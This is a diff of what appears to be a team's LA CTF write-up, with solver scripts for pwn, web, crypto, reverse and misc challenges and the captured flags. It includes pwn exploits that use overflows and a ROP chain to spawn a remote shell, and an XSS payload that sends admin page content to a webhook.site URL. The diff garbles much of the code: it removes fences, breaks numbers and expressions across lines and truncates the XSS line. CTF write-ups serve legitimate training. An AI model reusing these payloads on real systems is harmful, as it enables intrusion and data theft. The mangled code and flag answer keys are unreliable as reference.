@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-Pwn: 
+Pwn:
 
 2password
 
@@ -159,7 +159,7 @@ rl("2. Exit")
 sl(str(2))
 inter()       
 
- Web: 
+ Web:
 
 lucky-flag
 
@@ -208,11 +208,11 @@ mavs-fan
 
 需要https://协议，可以利用平台 https://webhook.site
 
-<img src="1" onerror="fetch('/admin').then(response=>response.text()).then(data=>{ fetch('https://webhook.site/32b7496f-5ad9-4441-8cb8-187519e89a41?cookie='+data,{method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'}})})">
+response.text()).then(data=>{ fetch('https://webhook.site/32b7496f-5ad9-4441-8cb8-187519e89a41?cookie='+data,{method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'}})})">
 
 lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}
 
- Crypto: 
+ Crypto:
 
 RSAaaS
 
@@ -378,8 +378,16 @@ from tqdm import *
 a=11757726666370053782817548198302445388809746389939427980645854709670708265483115672483931306046568514261486190552321796104493966732964851930344913717167921
 b=9316298142245085995566757124471149658002018003251252600095918734996897003201990424167404855208977317145296561668719706133104910348620855338447494773478465
 m=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096
-n=1980964852767999557498599502621425212038615883063007254256162579908485226875107930148362646802715697673894130843610462669005721175870228429137395055953462247114843515996904953953828387946359219361647098255311199845519533103532025471057912993700243243148408431035688881257256664732203299037740303561989627199
-ct=697584677221444077165088906390586465560410620590323020876795055933422520066167961966786477980512858295853054538983172639809825304352192179362983428146286368423607563039009298638233518366607129701361559117341625729444190401836335647162850383690376551554113314250018249067473333765380209569032032309422282324
+n=19809648527679995574985995026214252120386158830630072542561625799084852268
+7510793014836264680271569767389413084361046266900572117587022842913739505595
+3462247114843515996904953953828387946359219361647098255311199845519533103532
+0254710579129937002432431484084310356888812572566647322032990377403035619896
+27199
+ct=6975846772214440771650889063905864655604106205903230208767950559334225200
+6616796196678647798051285829585305453898317263980982530435219217936298342814
+6286368423607563039009298638233518366607129701361559117341625729444190401836
+3356471628503836903765515541133142500182490674733337653802095690320323094222
+82324
 
 S = 0
 for k in trange(1, 2**15):
@@ -414,7 +422,8 @@ sh = remote('chall.lac.tf',31180)
 sh.recvuntil(b"Here's the encrypted flag in hex: n")
 flag_enc = sh.recvuntil(b"n")
 sh.recvuntil(b'What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: ')
-k = flag_enc[:112]+hex(bytes_to_long(b'a'*8))[2:].encode()
+k = flag_enc[:
+112]+hex(bytes_to_long(b'a'*8))[2:].encode()
 k1 = hex(bytes_to_long(b'a'*8))[2:].encode()+flag_enc[-113:-1]
 # print(len(flag_enc))
 # print(bytes.fromhex(flag_enc.decode()))
@@ -428,7 +437,7 @@ sh.recv()
 # b"b'`b\x0e2\x1d\xdf\x813\xe1\xaf\xce\x92%\x0ft$as_extremely_convenient_to_get_the_flag_too_heh}'n"
 # lactf{seems_it_was_extremely_convenient_to_get_the_flag_too_heh}
 
- Reverse: 
+ Reverse:
 
 javascryption
 
@@ -564,7 +573,7 @@ int main() {
 
 lactf{are_you_ready_to_learn_what_comes_next?}
 
- Misc: 
+ Misc:
 
 extended
 
@@ -623,15 +632,10 @@ for i in range(6,9):
     p.sendline(b"1")
 
     p.interactive()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -646,7 +650,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -664,33 +668,28 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
 
 elf=ELF('./pwn')
 p=remote('chall.lac.tf',31593)
-#p = process('./pwn')
+    #p = process('./pwn')
 read=0x4012C1
 door=0x4011D6
 rl("Hey there, I'm deaddead. Who are you?")
 payload=b'a'*(0x20)+p64(0x404540+0x20-1)+p64(read)
-#bug()
+    #bug()
 s(payload)
 rl("Hey there, I'm deaddead. Who are you?")
 payload=p32(0xF1EEEE2D)#b'x2dxeexeexf1'#0x27
 pay=p32(0xF1EEEE2D)*9+b'a'*3+p64(door)
 s(pay)
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -705,7 +704,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -723,13 +722,13 @@ li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./libc.so.6')   
 
 elf=ELF('./pwn')
 p=remote('chall.lac.tf',31137)
-#p = process('./pwn')
+    #p = process('./pwn')
 
 rl("2. Multiplayer")
 sl(str(1))
@@ -741,7 +740,7 @@ sl(pay)
 rl("2. Creative")
 sl(str(1))
 rl("2. Exit")
-#bug()
+    #bug()
 sl(str(2))
 libc_base=get_addr64()-1914720
 li(hex(libc_base))
@@ -750,7 +749,7 @@ rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
 
 payload=p64(rdi)+p64(bin_sh)+p64(system)
 payload=payload.ljust(0x40,b'x00')+p64(0x404a00-8)+p64(0x401387)
-#bug()
+    #bug()
 sl(payload)
 
 rl("2. Creative")
@@ -759,11 +758,6 @@ rl("2. Exit")
 
 sl(str(2))
 inter()
-```
-
-
-
-```
 let enc = `"\u000e\u0003\u0001\u0016\u0004\u0019\u0015V\u0011=\u000bU=\u000e\u0017\u0001\t=R\u0010=\u0011\t\u000bSS\u001f"`;
 for (let i = 0; i < enc.length; ++i) {
   try {
@@ -776,11 +770,6 @@ for (const e of enc) {
 }
 const flag = rw.map(x => String.fromCharCode(x)).join('');
 console.log(`${flag}`);
-```
-
-
-
-```
 Stage token：B218B51749AB9E4C669E4B33122C8AE3
 
 A token in the HTML source code： 66E7AEBA46293C88D484CDAB0E479268 
@@ -802,17 +791,7 @@ A token where Google is told what pages to visit and index：F1C20B63
 A token received when making a DELETE request to this page：32BFBAEB91EFF980842D9FA19477A42E（curl -X DELETE "https://i-spy.chall.lac.tf"）
 
 A token in a TXT record at i-spy.chall.lac.tf：7227E8A26FC305B891065FE0A1D4B7D4
-```
-
-
-
-```
-<img src="1" onerror="fetch('/admin').then(response=>response.text()).then(data=>{ fetch('https://webhook.site/32b7496f-5ad9-4441-8cb8-187519e89a41?cookie='+data,{method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'}})})">
-```
-
-
-
-```
+response.text()).then(data=>{ fetch('https://webhook.site/32b7496f-5ad9-4441-8cb8-187519e89a41?cookie='+data,{method:'POST',headers:{'Content-Type': 'application/x-www-form-urlencoded'}})})">
 import gmpy2
 import random
 
@@ -851,11 +830,6 @@ Input q: 11667520860020090809
 Oh no! My service! Please don't give us a bad review!
 Here, have a complementary flag for your troubles.
 lactf{actually_though_whens_the_last_time_someone_checked_for_that}
-```
-
-
-
-```
 from Crypto.Util.number import long_to_bytes
 
 # 已知的密文、公钥指数和模数
@@ -886,18 +860,8 @@ pt = pow(ct_1, x, n) * pow(ct_2, y, n) % n
 # 将明文转换为字节串
 flag = long_to_bytes(pt)
 print(flag)
-```
-
-
-
-```
 not_the_flag = "mCtRNrPw_Ay9mytTR7ZpLJtrflqLS0BLpthi~2LgUY9cii7w"
 also_not_the_flag = "PKRcu0l}D823P2R8c~H9DMc{NmxDF{hD3cB~i1Db}kpR77iU"
-```
-
-
-
-```
 characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~_"
 
 def bigram_multiplicative_shift(bigram):
@@ -930,11 +894,6 @@ for sb in shifted_bigrams:
 
 for i, options in enumerate(possible_flag_bigrams):
     print(f"Position {i}: {options}")
-```
-
-
-
-```
 Position 0: ['la', 'mC', 'PK']
 Position 1: ['ct', 'tR', 'Rc']
 Position 2: ['f{', 'u0', 'Nr']
@@ -959,18 +918,21 @@ Position 20: ['we', 'UY', '}k']
 Position 21: ['pR', '3t', '9c']
 Position 22: ['ii', '77', '~~']
 Position 23: ['iU', '7w', '~}']
-```
-
-
-
-```
 from tqdm import *
 
 a=11757726666370053782817548198302445388809746389939427980645854709670708265483115672483931306046568514261486190552321796104493966732964851930344913717167921
 b=9316298142245085995566757124471149658002018003251252600095918734996897003201990424167404855208977317145296561668719706133104910348620855338447494773478465
 m=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096
-n=1980964852767999557498599502621425212038615883063007254256162579908485226875107930148362646802715697673894130843610462669005721175870228429137395055953462247114843515996904953953828387946359219361647098255311199845519533103532025471057912993700243243148408431035688881257256664732203299037740303561989627199
-ct=697584677221444077165088906390586465560410620590323020876795055933422520066167961966786477980512858295853054538983172639809825304352192179362983428146286368423607563039009298638233518366607129701361559117341625729444190401836335647162850383690376551554113314250018249067473333765380209569032032309422282324
+n=19809648527679995574985995026214252120386158830630072542561625799084852268
+7510793014836264680271569767389413084361046266900572117587022842913739505595
+3462247114843515996904953953828387946359219361647098255311199845519533103532
+0254710579129937002432431484084310356888812572566647322032990377403035619896
+27199
+ct=6975846772214440771650889063905864655604106205903230208767950559334225200
+6616796196678647798051285829585305453898317263980982530435219217936298342814
+6286368423607563039009298638233518366607129701361559117341625729444190401836
+3356471628503836903765515541133142500182490674733337653802095690320323094222
+82324
 
 S = 0
 for k in trange(1, 2**15):
@@ -986,21 +948,11 @@ for k in trange(1, 2**15):
                 p = int(s[0])
                 q = n // p
                 break
-```
-
-
-
-```
 from Crypto.Util.number import *
 p = 310180443514600074553153588766205730602580216449682597076277430107570143045263763584355152481873753139915964457263617871639390456137640662349248114935603
 q = 6386491779823495872266601837882790082742583093682566580830239466693364425397460872366805037313069394140075679106680750944711768870975155891667452968264133
 ct = 697584677221444077165088906390586465560410620590323020876795055933422520066167961966786477980512858295853054538983172639809825304352192179362983428146286368423607563039009298638233518366607129701361559117341625729444190401836335647162850383690376551554113314250018249067473333765380209569032032309422282324
 print(long_to_bytes(pow(ct,inverse(65537,(p-1)*(q-1)),p*q)))
-```
-
-
-
-```
 from Crypto.Util.number import *
 from pwn import *
 
@@ -1009,7 +961,8 @@ sh = remote('chall.lac.tf',31180)
 sh.recvuntil(b"Here's the encrypted flag in hex: n")
 flag_enc = sh.recvuntil(b"n")
 sh.recvuntil(b'What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: ')
-k = flag_enc[:112]+hex(bytes_to_long(b'a'*8))[2:].encode()
+k = flag_enc[:
+112]+hex(bytes_to_long(b'a'*8))[2:].encode()
 k1 = hex(bytes_to_long(b'a'*8))[2:].encode()+flag_enc[-113:-1]
 # print(len(flag_enc))
 # print(bytes.fromhex(flag_enc.decode()))
@@ -1022,11 +975,6 @@ sh.recv()
 # b"b'lactf{seems_it_was_extremely_convenient_to_get_t\xf4\xbd\x17\x97#\x8cW\xfei\xbf\xe17/iB.'n"
 # b"b'`b\x0e2\x1d\xdf\x813\xe1\xaf\xce\x92%\x0ft$as_extremely_convenient_to_get_the_flag_too_heh}'n"
 # lactf{seems_it_was_extremely_convenient_to_get_the_flag_too_heh}
-```
-
-
-
-```
 import base64
 import urllib.parse
 
@@ -1039,11 +987,6 @@ step1 = step2[::-1]
 
 flag = base64.b64decode(step1).decode()
 print(flag)
-```
-
-
-
-```
 target = "l_alcotsft{_tihne__ifnlfaign_igtoyt}"
 
 length = len(target)
@@ -1057,11 +1000,6 @@ for i in range(half):
 
 flag = "".join(s)
 print(flag)
-```
-
-
-
-```
 def valid(char, target_steps):
     bit_check = 0
     val = char
@@ -1091,15 +1029,10 @@ yi = [27, 38, 87, 95, 118, 9]
 input = solve(yi)
 
 print(f"{input}")
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <time.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <time.h>
 
 void unshuffle(char *a1, int *rand_values) {
     int v3;
@@ -1152,11 +1085,6 @@ int main() {
     fclose(output_file);
     return 0;
 }
-```
-
-
-
-```
 def solve(extended_flag):
     original_flag = ""
     for c in extended_flag:
@@ -1176,17 +1104,7 @@ with open("chall.txt", "rb") as f:
 
 flag = solve(extended_flag)
 print(flag)
-```
-
-
-
-```
 lactf{my_entire_team_agrees_to_follow_the_rules}
-```
-
-
-
-```
 lactf{i_l0v3_3d1t1ng_my_d1sc0rd_msgs}
 ```
 
